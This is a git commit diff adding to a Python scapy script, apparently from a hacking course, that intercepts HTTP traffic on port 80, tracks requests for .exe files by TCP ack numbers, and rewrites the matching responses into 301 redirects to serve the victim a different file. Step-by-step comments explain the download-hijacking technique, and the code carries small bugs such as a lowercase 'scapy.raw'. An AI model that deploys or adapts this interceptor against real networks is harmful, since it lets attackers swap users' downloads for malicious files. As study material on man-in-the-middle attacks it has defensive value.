390effcd9259215de00a5e6683732aa51f5088de
gs1-maheswarane <maheswaran.elumalai@expeditors.com>
2025-03-23 08:07:57 +0530

    March23 first commit

--- 6file-interceptor/1file-interceptor.py
+++ 6file-interceptor/1file-interceptor.py
@@ -20,6 +20,7 @@ import scapy.all as scapy
 # finally at the end, it appends the raw data such as http data in the raw layer
 # to check if a packet contains this layer, all we have to do is just type raw instead of DNS
 
+ack_list = []
 def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
     # 1
@@ -30,9 +31,110 @@ def process_packet(packet):
     # to check if a packet contains this layer, all we have to do is just type raw instead of DNS
 
 #2 Now we dont know, which packets are requests and which packets are responses
-    if scapy_packet.haslayer(scapy.Raw):
-        print(scapy_packet.show())
+# -> Using sport and dport of tcp layer we can find whether it is request or response
+#   request:
+#   ####[ Raw  ]###
+#     dport = http
+#     load = GET /HTTP/1.1
+#     ....
+#     Response:
+#     under tcp :
+#     sport = http
+# ####[ Raw  ]###
+# load = HTTP/1.1 301 Moved Permanently
+# .....
 
+# 5. we can use a simple if statement in our cdoe and say if dport is 80 then it is request
+#     and it is a packet leaving our computer to the destination of
+#     port 80 ,hence it is a request and if sport is 80 means it is a http response
+# if scapy_packet.haslayer(scapy.Raw):
+#     if scapy_packet[scapy.TCP].dport == 80:
+#         print("HTTP Request")
+#         print(scapy_packet.show())
+#     elif scapy_packet[scapy.TCP].sport == 80:
+#         print("HTTP response")
+#         print(scapy_packet.show())
+
+# 6 Now we have a program which filters http requests and responses. Lets
+# use it to analyze and see what happens when a user clicks on a download link and see
+# how we can use this information to hijack the download and serve the user
+# any other file we want
+
+    # if ".exe" in scapy_packet[scapy.raw].load:
+    #     print("[+] exe request")
+    #     print(scapy_packet.show())
+
+# 7 Before manually initiating  a http request, we need to establish a tcp handshake and then you
+# can server the target other files you want
+#     We can wait for the response and modify this response
+#     By this way, handsake has already been established and thereafter we
+#     can modify it without creating or establishing a new handshake
+
+# 8 So far our program is able to intercept downloads of a specific file
+# type. Now we will modify the response so that when target requests to download a specific file type,
+# we will serve them a completely different file
+#
+# In request if we see there will be ack,
+# ack = 175361025
+#
+# Similarly in response we can see seq in tcp layer which is of same value
+# of ack which is received in the request
+# seq = 175361025
+# We can use the same mechanism to check if the response corresponds to this request
+
+# 9 to do that, we will create a list ack_list and in process_packet
+# function i will append my ack_list
+#     ack_list.append(scapy_packet[scapy.TCP].ack)
+# So every time the request contains TCP with ack, ack_list will be appended
+# Then in the elif we will make check if seq is contained in the ack_list then
+# that means that this is a response to a request that was captured in the if statement
+#     if scapy_packet[scapy.TCP].seq in ack_list:
+#         print("[+] Replacing file we want to download"
+
+# 9 Since we have detected the ack and seq in the ack_list, we need to remove the
+# ack from the ack_list
+
+# 10
+# Next step: We will analyse the response and see how to modify it
+# In TCP -> we know that path where http data will be stored in raw is the load
+# #########[Raw] ###
+#     load = HTTP/1.1 200 OK\r\nServer: Apache\r\nETag
+
+    # Here 200 OK is the HTTP status code
+
+# To alter we can use the http status code for Redirection: 3xx, Redirection
+# allows us to redirect the request to somewhere else
+# If client requests something from a certain website we can use 300 status code
+# We will be using 301 - Moved permanently status code
+
+# Example for 301 status code
+# Client request:
+#
+# GET /index.php HTTP/1.1
+# Host: www.example.org
+# Server response:
+#
+# HTTP/1.1 301 Moved Permanently
+# Location: https://www.example.org/index.asp
+#
+
+# 11 So basically i have change my load in http response from 201 ok to 301 moved Permanently
+#     scapy_packet[scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\nLocation: https://www.example.org/index.asp"
+
+    if scapy_packet.haslayer(scapy.Raw):
+        if scapy_packet[scapy.TCP].dport == 80:
+            print("HTTP Request")
+            if ".exe" in scapy_packet[scapy.raw].load:
+                print("[+] exe request")
+                ack_list.append(scapy_packet[scapy.TCP].ack)
+                print(scapy_packet.show())
+        elif scapy_packet[scapy.TCP].sport ==80:
+            print("HTTP response")
+            if scapy_packet[scapy.TCP].seq in ack_list:
+                ack_list.remove(scapy_packet[scapy.TCP].seq)
+                print("[+] Replacing file we want to download")
+                scapy_packet[scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\nLocation: https://www.example.org/index.asp"
+            print(scapy_packet.show())
 
 
 
